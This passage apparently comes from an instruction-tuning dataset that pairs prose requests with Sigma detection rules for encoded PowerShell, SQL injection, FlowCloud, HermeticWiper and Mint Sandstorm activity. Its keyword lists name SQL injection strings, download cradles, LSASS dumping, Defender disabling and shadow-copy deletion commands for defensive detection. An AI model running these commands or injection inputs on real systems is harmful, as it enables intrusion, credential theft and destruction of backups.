    "instruction": "Build a Sigma rule with the goal of detecting suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines, you should: monitor the creation of processes on Windows systems for command lines that contain certain patterns indicative of obfuscated PowerShell code. Specifically, look for command lines that include UTF16 and base64 encoded strings which are typically associated with attempts to bypass detection mechanisms by obscuring the true nature of the PowerShell commands being executed. These patterns include snippets that translate to PowerShell syntax for bitwise XOR operations (\u2018bxor 0x\u2019 and variations thereof) and method invocation (\u2018.Invoke() |\u2019), as well as PowerShell format string operators (\u2018-f\u2019) used in a manner suggesting attempts to construct and execute code dynamically. High priority should be given to these detections due to the nature of the encoded and obfuscated content, which is commonly used in malicious scripts. Note that due to the obfuscated nature of the detected activity, false positives may be unknown, indicating a high level of confidence in the specificity of these indicators for malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            #  -bxor 0x\n            - 'IAAtAGIAeABvAHIAIAAwAHgA'\n            - 'AALQBiAHgAbwByACAAMAB4A'\n            - 'gAC0AYgB4AG8AcgAgADAAeA'\n            # .Invoke() |\n            - 'AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg'\n            - 'AuAEkAbgB2AG8AawBlACgAKQAgAHwAI'\n            - 'ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC'\n            # {1}{0}\" -f\n            # {0}{3}\" -f\n            # {2}{0}\" -f\n            - 'AHsAMQB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AIgAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACIAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAiACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AIgAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AIgAgAC0AZgAg'\n            # {1}{0}' -f\n            # {0}{3}' -f\n            # {2}{0}' -f\n            - 'AHsAMQB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AJwAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACcAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAnACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AJwAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AJwAgAC0AZgAg'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            #  -bxor 0x\n            - 'IAAtAGIAeABvAHIAIAAwAHgA'\n            - 'AALQBiAHgAbwByACAAMAB4A'\n            - 'gAC0AYgB4AG8AcgAgADAAeA'\n            # .Invoke() |\n            - 'AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg'\n            - 'AuAEkAbgB2AG8AawBlACgAKQAgAHwAI'\n            - 'ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC'\n            # {1}{0}\" -f\n            # {0}{3}\" -f\n            # {2}{0}\" -f\n            - 'AHsAMQB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AIgAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACIAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAiACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AIgAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AIgAgAC0AZgAg'\n            # {1}{0}' -f\n            # {0}{3}' -f\n            # {2}{0}' -f\n            - 'AHsAMQB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AJwAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACcAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAnACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AJwAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AJwAgAC0AZgAg'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines",
      "answer": "In order to detect suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines, you should: monitor the creation of processes on Windows systems for command lines that contain certain patterns indicative of obfuscated PowerShell code. Specifically, look for command lines that include UTF16 and base64 encoded strings which are typically associated with attempts to bypass detection mechanisms by obscuring the true nature of the PowerShell commands being executed. These patterns include snippets that translate to PowerShell syntax for bitwise XOR operations (\u2018bxor 0x\u2019 and variations thereof) and method invocation (\u2018.Invoke() |\u2019), as well as PowerShell format string operators (\u2018-f\u2019) used in a manner suggesting attempts to construct and execute code dynamically. High priority should be given to these detections due to the nature of the encoded and obfuscated content, which is commonly used in malicious scripts. Note that due to the obfuscated nature of the detected activity, false positives may be unknown, indicating a high level of confidence in the specificity of these indicators for malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SQL Injection attempts via GET requests in access logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SQL Injection attempts via GET requests in access logs, you should monitor web server logs for specific patterns indicative of such attacks. Focus on logs from web servers as the primary source of data. Look for GET requests that contain certain keywords or phrases often used in SQL injection attacks. These include:\n\n- Explicit 'SELECT' statements, which might appear URL-encoded as '=select ', '=select%20', '=select(', and variations thereof.\n- 'UNION SELECT' statements, including 'UNION%20SELECT', 'UNION ALL SELECT', and 'UNION%20ALL%20SELECT', which attackers use to combine results from multiple SELECT queries.\n- Attempts to concatenate strings within queries, indicated by 'CONCAT(0x'.\n- Usage of 'ORDER BY' clauses, either in plain text ('order by ') or URL-encoded ('order%20by%20').\n- Probing for 'information_schema.tables', which is a metadata table containing the names and other details of all tables in a database.\n- The presence of 'group_concat(', 'table_schema', 'select%28sleep%2810%29', which can be indicators of attempts to extract data or induce time delays in response.\n- The version of the database server being queried ('@@version').\n- Attempts to exploit logical weaknesses, such as \"'1'='1\" or its URL-encoded version, and variations of 'or 1=1#' to bypass authentication or authorization checks.\n- Queries attempting to select all records, via 'select * ' or 'select%20*%20'.\n\nExclude log entries with a 404 status code (`sc-status: 404`) as these requests did not result in a page or resource being found, and may reduce the number of false positives.\n\nPay attention to the origin of the requests by logging fields such as 'client_ip', 'vhost' (virtual host), 'url', and 'response'. These details will be crucial for investigating and mitigating any detected attacks.\n\nBe aware that there could be false positives from legitimate actions, such as Java scripts and CSS file requests, legitimate user searches in website search boxes, and internal vulnerability scanning activities. To reduce false positives, consider refining the detection mechanism by excluding patterns typical for benign requests or by adding more filters like specific user agent strings and additional response codes.\n\nOverall, monitoring for these patterns at a high level of vigilance is critical for identifying potential SQL Injection attacks conducted through GET requests in web server access logs.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    select_method:\n        cs-method: 'GET'\n    keywords:\n        - '=select '\n        - '=select%20'\n        - '=select('\n        - 'UNION SELECT'\n        - 'UNION%20SELECT'\n        - 'UNION ALL SELECT'\n        - 'UNION%20ALL%20SELECT'\n        - 'CONCAT(0x'\n        - 'order by '\n        - 'order%20by%20'\n        - 'information_schema.tables'\n        - 'group_concat('\n        - 'table_schema'\n        - 'select%28sleep%2810%29'\n        - '@@version'\n        - \"'1'='1\"\n        - '%271%27%3D%271'\n        - 'SELECTCHAR('\n        - 'select * '\n        - 'select%20*%20'\n        - 'or 1=1#'\n        - 'or%201=1#'\n    filter:\n        sc-status: 404\n    condition: select_method and keywords and not 1 of filter*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Java scripts and CSS Files\n    - User searches in search boxes of the respective website\n    - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as \"User Agent\" strings and more response codes\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    select_method:\n        cs-method: 'GET'\n    keywords:\n        - '=select '\n        - '=select%20'\n        - '=select('\n        - 'UNION SELECT'\n        - 'UNION%20SELECT'\n        - 'UNION ALL SELECT'\n        - 'UNION%20ALL%20SELECT'\n        - 'CONCAT(0x'\n        - 'order by '\n        - 'order%20by%20'\n        - 'information_schema.tables'\n        - 'group_concat('\n        - 'table_schema'\n        - 'select%28sleep%2810%29'\n        - '@@version'\n        - \"'1'='1\"\n        - '%271%27%3D%271'\n        - 'SELECTCHAR('\n        - 'select * '\n        - 'select%20*%20'\n        - 'or 1=1#'\n        - 'or%201=1#'\n    filter:\n        sc-status: 404\n    condition: select_method and keywords and not 1 of filter*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Java scripts and CSS Files\n    - User searches in search boxes of the respective website\n    - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as \"User Agent\" strings and more response codes\nlevel: high\n",
      "question": "SQL Injection attempts via GET requests in access logs",
      "answer": "In order to detect SQL Injection attempts via GET requests in access logs, you should monitor web server logs for specific patterns indicative of such attacks. Focus on logs from web servers as the primary source of data. Look for GET requests that contain certain keywords or phrases often used in SQL injection attacks. These include:\n\n- Explicit 'SELECT' statements, which might appear URL-encoded as '=select ', '=select%20', '=select(', and variations thereof.\n- 'UNION SELECT' statements, including 'UNION%20SELECT', 'UNION ALL SELECT', and 'UNION%20ALL%20SELECT', which attackers use to combine results from multiple SELECT queries.\n- Attempts to concatenate strings within queries, indicated by 'CONCAT(0x'.\n- Usage of 'ORDER BY' clauses, either in plain text ('order by ') or URL-encoded ('order%20by%20').\n- Probing for 'information_schema.tables', which is a metadata table containing the names and other details of all tables in a database.\n- The presence of 'group_concat(', 'table_schema', 'select%28sleep%2810%29', which can be indicators of attempts to extract data or induce time delays in response.\n- The version of the database server being queried ('@@version').\n- Attempts to exploit logical weaknesses, such as \"'1'='1\" or its URL-encoded version, and variations of 'or 1=1#' to bypass authentication or authorization checks.\n- Queries attempting to select all records, via 'select * ' or 'select%20*%20'.\n\nExclude log entries with a 404 status code (`sc-status: 404`) as these requests did not result in a page or resource being found, and may reduce the number of false positives.\n\nPay attention to the origin of the requests by logging fields such as 'client_ip', 'vhost' (virtual host), 'url', and 'response'. These details will be crucial for investigating and mitigating any detected attacks.\n\nBe aware that there could be false positives from legitimate actions, such as Java scripts and CSS file requests, legitimate user searches in website search boxes, and internal vulnerability scanning activities. To reduce false positives, consider refining the detection mechanism by excluding patterns typical for benign requests or by adding more filters like specific user agent strings and additional response codes.\n\nOverall, monitoring for these patterns at a high level of vigilance is critical for identifying potential SQL Injection attacks conducted through GET requests in web server access logs."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting programs with network connections running in suspicious files system locations.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect programs with network connections running in suspicious file system locations, you should: focus on monitoring network connection events, specifically those identified by Event ID 3, on Windows-based systems. Pay special attention to any network activity originating from or involving executable files located in unusual or sensitive system directories. These directories include, but are not limited to '\\Users\\All Users\\', '\\Users\\Default\\', '\\Users\\Public\\', '\\Users\\Contacts\\', '\\Users\\Searches\\', '\\config\\systemprofile\\', '\\Windows\\Fonts\\', '\\Windows\\IME\\', '\\Windows\\addins\\', and direct accesses to the '\\$Recycle.bin'. Additionally, be wary of connections initiated from 'C:\\Perflogs\\'. However, it's crucial to exclude and not consider network activities related to the specific path 'C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\', as connections from this directory are known to produce false positives and are associated with benign behavior linked to IBM Client Solutions. By applying these guidelines, you can more accurately identify and manage potential threats exploiting network connections from compromised or maliciously used directories, mitigating false positive alerts in the process.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\n    definition: 'Use the following config to generate the necessary Event ID 3 Network Connection events'\ndetection:\n    selection:\n        - Image|contains:\n            # - '\\ProgramData\\'  # too many false positives, e.g. with Webex for Windows\n            - '\\Users\\All Users\\'\n            - '\\Users\\Default\\'\n            - '\\Users\\Public\\'\n            - '\\Users\\Contacts\\'\n            - '\\Users\\Searches\\'\n            - '\\config\\systemprofile\\'\n            - '\\Windows\\Fonts\\'\n            - '\\Windows\\IME\\'\n            - '\\Windows\\addins\\'\n        - Image|endswith: '\\$Recycle.bin'\n        - Image|startswith: 'C:\\Perflogs\\'\n    false_positive1:\n        Image|startswith: 'C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\' # IBM Client Solutions Default Location\n    condition: selection and not 1 of false_positive*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\n    definition: 'Use the following config to generate the necessary Event ID 3 Network Connection events'\ndetection:\n    selection:\n        - Image|contains:\n            # - '\\ProgramData\\'  # too many false positives, e.g. with Webex for Windows\n            - '\\Users\\All Users\\'\n            - '\\Users\\Default\\'\n            - '\\Users\\Public\\'\n            - '\\Users\\Contacts\\'\n            - '\\Users\\Searches\\'\n            - '\\config\\systemprofile\\'\n            - '\\Windows\\Fonts\\'\n            - '\\Windows\\IME\\'\n            - '\\Windows\\addins\\'\n        - Image|endswith: '\\$Recycle.bin'\n        - Image|startswith: 'C:\\Perflogs\\'\n    false_positive1:\n        Image|startswith: 'C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\' # IBM Client Solutions Default Location\n    condition: selection and not 1 of false_positive*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "programs with network connections running in suspicious files system locations",
      "answer": "In order to detect programs with network connections running in suspicious file system locations, you should: focus on monitoring network connection events, specifically those identified by Event ID 3, on Windows-based systems. Pay special attention to any network activity originating from or involving executable files located in unusual or sensitive system directories. These directories include, but are not limited to '\\Users\\All Users\\', '\\Users\\Default\\', '\\Users\\Public\\', '\\Users\\Contacts\\', '\\Users\\Searches\\', '\\config\\systemprofile\\', '\\Windows\\Fonts\\', '\\Windows\\IME\\', '\\Windows\\addins\\', and direct accesses to the '\\$Recycle.bin'. Additionally, be wary of connections initiated from 'C:\\Perflogs\\'. However, it's crucial to exclude and not consider network activities related to the specific path 'C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\', as connections from this directory are known to produce false positives and are associated with benign behavior linked to IBM Client Solutions. By applying these guidelines, you can more accurately identify and manage potential threats exploiting network connections from compromised or maliciously used directories, mitigating false positive alerts in the process."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting FlowCloud malware from threat group TA410..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect FlowCloud malware from threat group TA410, you should monitor the Windows Registry for interactions with very specific keys. These interactions involve looking for any activities targeting the registry keys: 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}', 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}', and 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'. In addition to these specific keys, attention should also be given to any registry operations involving keys that begin with 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'. This approach is crucial in the effort to intercept and identify actions that could be related to the FlowCloud malware's operational footprint within an infected system. Given the critical nature of this detection, vigilance is advised, although one should be aware of the possibility of encountering unknown false positives during monitoring.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_event\ndetection:\n    selection:\n        - TargetObject:\n            - 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}'\n            - 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}'\n            - 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'\n        - TargetObject|startswith: 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_event\ndetection:\n    selection:\n        - TargetObject:\n            - 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}'\n            - 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}'\n            - 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'\n        - TargetObject|startswith: 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "FlowCloud malware from threat group TA410.",
      "answer": "In order to detect FlowCloud malware from threat group TA410, you should monitor the Windows Registry for interactions with very specific keys. These interactions involve looking for any activities targeting the registry keys: 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}', 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}', and 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'. In addition to these specific keys, attention should also be given to any registry operations involving keys that begin with 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'. This approach is crucial in the effort to intercept and identify actions that could be related to the FlowCloud malware's operational footprint within an infected system. Given the critical nature of this detection, vigilance is advised, although one should be aware of the possibility of encountering unknown false positives during monitoring."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling the CrashDump per registry (as used by HermeticWiper).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling the CrashDump per registry (as used by HermeticWiper), you should monitor for specific registry settings changes within Windows systems. This involves keeping an eye on events where the registry set category indicates a 'SetValue' EventType. Specifically, you should focus on modifications to the 'SYSTEM\\CurrentControlSet\\Control\\CrashControl' registry key. The detection criterion hinges on locating changes where the details field confirms a setting adjustment to 'DWORD (0x00000000)', which effectively disables crash dumps. It's important to consider that while monitoring these actions can help identify potential malicious activity, there could be instances where these settings are legitimately altered, thus a careful analysis is necessary to differentiate between harmful actions and false positives. This approach aligns with identifying tactics and techniques associated with persistence and defense evasion, reflecting the operational patterns of the HermeticWiper malware and similar threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SYSTEM\\CurrentControlSet\\Control\\CrashControl'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Legitimate disabling of crashdumps\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SYSTEM\\CurrentControlSet\\Control\\CrashControl'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Legitimate disabling of crashdumps\nlevel: medium\n",
      "question": "disabling the CrashDump per registry (as used by HermeticWiper)",
      "answer": "In order to detect disabling the CrashDump per registry (as used by HermeticWiper), you should monitor for specific registry settings changes within Windows systems. This involves keeping an eye on events where the registry set category indicates a 'SetValue' EventType. Specifically, you should focus on modifications to the 'SYSTEM\\CurrentControlSet\\Control\\CrashControl' registry key. The detection criterion hinges on locating changes where the details field confirms a setting adjustment to 'DWORD (0x00000000)', which effectively disables crash dumps. It's important to consider that while monitoring these actions can help identify potential malicious activity, there could be instances where these settings are legitimately altered, thus a careful analysis is necessary to differentiate between harmful actions and false positives. This approach aligns with identifying tactics and techniques associated with persistence and defense evasion, reflecting the operational patterns of the HermeticWiper malware and similar threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PowerShell core DLL being loaded by an Office Product.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PowerShell core DLL being loaded by an Office Product, you should monitor for the loading of specific images in Windows. This entails tracking when any of the main Office applications, such as Excel, Microsoft Publisher, Outlook, OneNote (including a specific variant labeled 'onenoteim' for completeness), PowerPoint, and Word, loads images. The detection hinges on identifying when these applications load either 'System.Management.Automation.Dll' or 'System.Management.Automation.ni.Dll,' which are core components of PowerShell. This activity is noteworthy as it could suggest an attempt to execute PowerShell commands or scripts in a manner that leverages Office products, possibly for malicious purposes. The monitoring for such behavior is set at a medium level of concern due to the potential for false positives, which are currently unspecified but could arise from legitimate uses of PowerShell functionalities within these Office applications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\excel.exe'\n            - '\\mspub.exe'\n            - '\\outlook.exe'\n            - '\\onenote.exe'\n            - '\\onenoteim.exe' # Just in case\n            - '\\powerpnt.exe'\n            - '\\winword.exe'\n        ImageLoaded|contains:\n            - '\\System.Management.Automation.Dll'\n            - '\\System.Management.Automation.ni.Dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\excel.exe'\n            - '\\mspub.exe'\n            - '\\outlook.exe'\n            - '\\onenote.exe'\n            - '\\onenoteim.exe' # Just in case\n            - '\\powerpnt.exe'\n            - '\\winword.exe'\n        ImageLoaded|contains:\n            - '\\System.Management.Automation.Dll'\n            - '\\System.Management.Automation.ni.Dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "PowerShell core DLL being loaded by an Office Product",
      "answer": "In order to detect PowerShell core DLL being loaded by an Office Product, you should monitor for the loading of specific images in Windows. This entails tracking when any of the main Office applications, such as Excel, Microsoft Publisher, Outlook, OneNote (including a specific variant labeled 'onenoteim' for completeness), PowerPoint, and Word, loads images. The detection hinges on identifying when these applications load either 'System.Management.Automation.Dll' or 'System.Management.Automation.ni.Dll,' which are core components of PowerShell. This activity is noteworthy as it could suggest an attempt to execute PowerShell commands or scripts in a manner that leverages Office products, possibly for malicious purposes. The monitoring for such behavior is set at a medium level of concern due to the potential for false positives, which are currently unspecified but could arise from legitimate uses of PowerShell functionalities within these Office applications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious execution from ManageEngine as seen used by Mint Sandstorm.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious execution from ManageEngine as seen used by Mint Sandstorm, you should:\n\nFocus on the creation of processes within Windows operating systems, specifically monitoring the parent processes for instances of ManageEngine applications or the use of Java. You should be vigilant for child processes that involve PowerShell (either powershell.exe or powershell_ise.exe). Additionally, pay attention to PowerShell command lines that include specific keywords indicating potentially malicious activities, such as commands for dumping credentials, manipulating local group memberships, downloading files, executing web requests, handling encoded commands, and various other suspicious activities.\n\nAlso, monitor for the use of command-line tools targeting the Local Security Authority Subsystem Service (LSASS), including use cases that might involve dumping process memory or querying system information, commands initiating external network connections via tools like `wget` or `curl`, and the manipulation of user groups and system configurations through command-line interfaces. This includes adding users to local administrator groups, making unauthorized network configurations, disabling anti-spyware features, deleting shadow copies, and other actions that could undermine system integrity and security.\n\nPay extra attention to commands attempting to modify critical system settings through the Registry Editor, use of WMIC for process creation or deletion, and the utilization of utilities designed for backup management or shadow copy deletion, indicating an attempt to hamper system recovery.\n\nBe wary of false positive indicators and ensure that legitimate administrative activities, especially those involving ManageEngine sites or downloading Microsoft components, are not incorrectly flagged. The detection thresholds outlined are critical due to the potential impact and sophistication of the tactics involved.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent_path:\n        ParentImage|contains:\n            - 'manageengine'\n            - 'ServiceDesk'\n    selection_parent_image:\n        ParentImage|contains: '\\java'\n    selection_special_child_powershell_img:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\powershell_ise.exe'\n    selection_special_child_powershell_cli:\n        - CommandLine|contains:\n            - ' echo '\n            - '-dumpmode'\n            - '-ssh'\n            - '.dmp'\n            - 'add-MpPreference'\n            - 'adscredentials'\n            - 'bitsadmin'\n            - 'certutil'\n            - 'csvhost.exe'\n            - 'DownloadFile'\n            - 'DownloadString'\n            - 'dsquery'\n            - 'ekern.exe'\n            - 'FromBase64String'\n            - 'iex '\n            - 'iex('\n            - 'Invoke-Expression'\n            - 'Invoke-WebRequest'\n            - 'localgroup administrators'\n            - 'net group'\n            - 'net user'\n            - 'o365accountconfiguration'\n            - 'query session'\n            - 'samaccountname='\n            - 'set-MpPreference'\n            - 'svhost.exe'\n            - 'System.IO.Compression'\n            - 'System.IO.MemoryStream'\n            - 'usoprivate'\n            - 'usoshared'\n            - 'whoami'\n        - CommandLine|re: '[-/\u2013][Ee^]{1,2}[ncodema^]*\\s[A-Za-z0-9+/=]{15,}'\n    selection_special_child_lsass_1:\n        CommandLine|contains: 'lsass'\n    selection_special_child_lsass_2:\n        CommandLine|contains:\n            - 'procdump'\n            - 'tasklist'\n            - 'findstr'\n    selection_child_wget:\n        Image|endswith: '\\wget.exe'\n        CommandLine|contains: 'http'\n    selection_child_curl:\n        Image|endswith: '\\curl.exe'\n        CommandLine|contains: 'http'\n    selection_child_script:\n        CommandLine|contains:\n            - 'E:jscript'\n            - 'e:vbscript'\n    selection_child_localgroup:\n        CommandLine|contains|all:\n            - 'localgroup Administrators'\n            - '/add'\n    selection_child_net:\n        CommandLine|contains: 'net' # Covers net1\n        CommandLine|contains|all:\n            - 'user'\n            - '/add'\n    selection_child_reg:\n        - CommandLine|contains|all:\n            - 'reg add'\n            - 'DisableAntiSpyware'\n            - '\\Microsoft\\Windows Defender'\n        - CommandLine|contains|all:\n            - 'reg add'\n            - 'DisableRestrictedAdmin'\n            - 'CurrentControlSet\\Control\\Lsa'\n    selection_child_wmic_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'process call create'\n    selection_child_wmic_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'delete'\n            - 'shadowcopy'\n    selection_child_vssadmin:\n        CommandLine|contains|all:\n            - 'vssadmin'\n            - 'delete'\n            - 'shadows'\n    selection_child_wbadmin:\n        CommandLine|contains|all:\n            - 'wbadmin'\n            - 'delete'\n            - 'catalog'\n    filter_main:\n        CommandLine|contains|all:\n            - 'download.microsoft.com'\n            - 'manageengine.com'\n            - 'msiexec'\n    condition: all of selection_parent_* and (all of selection_special_child_powershell_* or all of selection_special_child_lsass_* or 1 of selection_child_*) and not filter_main\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent_path:\n        ParentImage|contains:\n            - 'manageengine'\n            - 'ServiceDesk'\n    selection_parent_image:\n        ParentImage|contains: '\\java'\n    selection_special_child_powershell_img:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\powershell_ise.exe'\n    selection_special_child_powershell_cli:\n        - CommandLine|contains:\n            - ' echo '\n            - '-dumpmode'\n            - '-ssh'\n            - '.dmp'\n            - 'add-MpPreference'\n            - 'adscredentials'\n            - 'bitsadmin'\n            - 'certutil'\n            - 'csvhost.exe'\n            - 'DownloadFile'\n            - 'DownloadString'\n            - 'dsquery'\n            - 'ekern.exe'\n            - 'FromBase64String'\n            - 'iex '\n            - 'iex('\n            - 'Invoke-Expression'\n            - 'Invoke-WebRequest'\n            - 'localgroup administrators'\n            - 'net group'\n            - 'net user'\n            - 'o365accountconfiguration'\n            - 'query session'\n            - 'samaccountname='\n            - 'set-MpPreference'\n            - 'svhost.exe'\n            - 'System.IO.Compression'\n            - 'System.IO.MemoryStream'\n            - 'usoprivate'\n            - 'usoshared'\n            - 'whoami'\n        - CommandLine|re: '[-/\u2013][Ee^]{1,2}[ncodema^]*\\s[A-Za-z0-9+/=]{15,}'\n    selection_special_child_lsass_1:\n        CommandLine|contains: 'lsass'\n    selection_special_child_lsass_2:\n        CommandLine|contains:\n            - 'procdump'\n            - 'tasklist'\n            - 'findstr'\n    selection_child_wget:\n        Image|endswith: '\\wget.exe'\n        CommandLine|contains: 'http'\n    selection_child_curl:\n        Image|endswith: '\\curl.exe'\n        CommandLine|contains: 'http'\n    selection_child_script:\n        CommandLine|contains:\n            - 'E:jscript'\n            - 'e:vbscript'\n    selection_child_localgroup:\n        CommandLine|contains|all:\n            - 'localgroup Administrators'\n            - '/add'\n    selection_child_net:\n        CommandLine|contains: 'net' # Covers net1\n        CommandLine|contains|all:\n            - 'user'\n            - '/add'\n    selection_child_reg:\n        - CommandLine|contains|all:\n            - 'reg add'\n            - 